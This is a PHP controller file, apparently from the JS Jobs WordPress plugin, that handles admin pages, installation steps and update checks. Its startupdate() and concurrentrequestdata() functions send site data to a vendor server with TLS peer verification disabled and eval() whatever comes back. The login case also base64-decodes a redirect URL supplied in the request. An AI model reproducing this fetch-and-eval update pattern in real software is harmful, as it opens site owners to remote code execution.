<?php

if (!defined('ABSPATH'))
    die('Restricted Access');

class JSJOBSJsjobsController {

    function __construct() {

        self::handleRequest();
    }

    function handleRequest() {
        $layout = JSJOBSrequest::getLayout('jsjobslt', null, 'controlpanel');
        if (self::canaddfile()) {
            switch ($layout) {
                case 'admin_controlpanel':
                    JSJOBSincluder::getJSModel('jsjobs')->getAdminControlPanelData();
                    break;
                case 'admin_jsjobsstats':
                    JSJOBSincluder::getJSModel('jsjobs')->getJsjobsStats();
                    break;
                case 'info':
                    $id = JSJOBSrequest::getVar('jsjobsid');
                    JSJOBSincluder::getJSModel('announcement')->getAnnouncementDetails($id);
                    break;
                case 'updates':

                    break;
                case 'login':
                    if(JSJOBSincluder::getObjectClass('user')->isguest()){
                        $url = JSJOBSrequest::getVar('jsjobsredirecturl');
                        if(isset($url)){
                            jsjobs::$_data[0]['redirect_url'] = base64_decode($url);
                        }else{
                            jsjobs::$_data[0]['redirect_url'] = home_url();
                        }
                    }else{
                        $finalurl = wp_logout_url(get_permalink());
                        jsjobs::$_error_flag = true;
                        if(class_exists('job_manager_Messages')){
                            job_manager_Messages::alreadyLoggedIn($finalurl);
                        }else{
                            JSJOBSLayout::getUserAlreadyLoggedin($finalurl);
                        }
                    }
                    break;
                case 'admin_stepone': //Installation
                    $array = explode('.', phpversion());
                    $phpversion = $array[0] . '.' . $array[1];
                    $curlexist = function_exists('curl_version');
                    //$curlversion = curl_version()['version'];
                    if (extension_loaded('gd') && function_exists('gd_info')) {
                        $gd_lib = 1;
                    } else {
                        $gd_lib = 0;
                    }
                    $zip_lib = 0;
                    if (file_exists(jsjobs::$_path . 'includes/lib/pclzip.lib.php')) {
                        $zip_lib = 1;
                    }
                    jsjobs::$_data[0]['phpversion'] = $phpversion;
                    // jsjobs::$_data[0]['curlversion'] = $curlversion;
                    jsjobs::$_data[0]['gd_lib'] = $gd_lib;
                    jsjobs::$_data[0]['zip_lib'] = $zip_lib;
                    jsjobs::$_data[0]['curlexist'] = $curlexist;
                    break;
                case 'admin_steptwo' ://Installation
                    JSJOBSincluder::getJSModel('jsjobs')->getStepTwoValidate();
                break;
                case 'admin_stepthree' : //Installation
                    if(isset($_SESSION['response'])){
                        jsjobs::$_data['response'] = $_SESSION['response'];
                        unset($_SESSION['response']);
                    }else{
                        jsjobs::$_data['response'] = '';
                    }
                    if(isset($_SESSION['transactionkey'])){
                        jsjobs::$_data['transactionkey'] = $_SESSION['transactionkey'];
                        unset($_SESSION['transactionkey']);
                    }else{
                        jsjobs::$_data['transactionkey'] = '';
                    }
                    
                break;
            }
            $module = (is_admin()) ? 'page' : 'jsjobsme';
            $module = JSJOBSrequest::getVar($module, null, 'jsjobs');
            $module = str_replace('jsjobs_', '', $module);
            if($layout=="thankyou"){
                if($module=="" || $module!="jsjobs") $module="jsjobs";
            }
            JSJOBSincluder::include_file($layout, $module);
        }
    }

    function canaddfile() {
        if (isset($_POST['form_request']) && $_POST['form_request'] == 'jsjobs')
            return false;
        elseif (isset($_GET['action']) && $_GET['action'] == 'jsjobtask')
            return false;
        else
            return true;
    }

    function startupdate() {
        $data = JSJOBSincluder::getJSModel('jsjobs')->getConcurrentRequestData();
        $url = "https://setup.joomsky.com/jsjobs/pro/update.php";
        $post_data['serialnumber'] = $data['serialnumber'];
        $post_data['zvdk'] = $data['zvdk'];
        $post_data['hostdata'] = $data['hostdata'];
        $post_data['domain'] = site_url();
        $post_data['transactionkey'] = JSJOBSrequest::getVar('transactionkey', false);
        $post_data['producttype'] = JSJOBSrequest::getVar('producttype');
        $post_data['productcode'] = JSJOBSrequest::getVar('productcode');
        $post_data['productversion'] = JSJOBSrequest::getVar('productversion');
        $post_data['count'] = JSJOBSrequest::getVar('count_config');
        $post_data['JVERSION'] = JVERSION;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        if ($response === false)
            echo 'Curl error: ' . curl_error($ch);
        else
            eval($response);
        curl_close($ch);
    }

    function concurrentrequestdata() {
        $jsjobs_model = JSJOBSincluder::getJSModel('Jsjobs', 'JSJOBSModel');
        $data = $jsjobs_model->getConcurrentRequestData();
        $url = "https://setup.joomsky.com/jsjobs/pro/verifier.php";
        $post_data['serialnumber'] = $data['serialnumber'];
        $post_data['zvdk'] = $data['zvdk'];
        $post_data['hostdata'] = $data['hostdata'];
        $post_data['domain'] = site_url();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
        $response = curl_exec($ch);
        curl_close($ch);
        eval($response);
    }
    
    function getversionlist() {
        $data =  JSJOBSrequest::get('post');
        $response = JSJOBSincluder::getJSModel('jsjobs')->getmyversionlist($data);
        $response = base64_encode($response);
        $_SESSION['response'] = $response;
        $url = admin_url("admin.php?page=jsjobs&jsjobslt=stepthree");
        wp_redirect($url);
        die();
    }


}

$JSJOBSJsjobsController = new JSJOBSJsjobsController();
?>
